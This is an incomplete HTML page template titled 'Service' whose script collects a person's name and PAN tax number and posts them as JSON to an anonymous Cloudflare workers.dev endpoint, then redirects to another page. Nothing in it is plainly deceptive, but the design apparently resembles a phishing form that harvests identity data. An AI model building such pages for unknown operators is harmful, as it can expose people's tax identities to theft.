<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Service</title>
    <style>/* your style */</style>
</head>
<body>
    <!-- header/footer -->
    <script>
        document.querySelector('.submit-button').addEventListener('click', async function(e) {
            e.preventDefault();
            const panName = document.getElementById('panName').value.trim();
            const panNumber = document.getElementById('panNumber').value.trim();
            // validation...

            const submission = {
                id: Date.now(),
                type: 'PAN',
                data: { name: panName, pan: panNumber },
                timestamp: new Date().toISOString()
            };

            try {
                const response = await fetch('https://aged-sunset-63e0.skd38824.workers.dev/', {
                    method: 'POST',
                    mode: 'cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(submission)
                });
                if (response.ok) {
                    const result = await response.json();
                    if (result.success) window.location.href = 'blogtwo.html';
                    else alert('Error: ' + result.error);
                } else alert('Server error: ' + response.status);
            } catch (error) { alert('Network error: ' + error.message); }
        });
    </script>
</body>
</html>
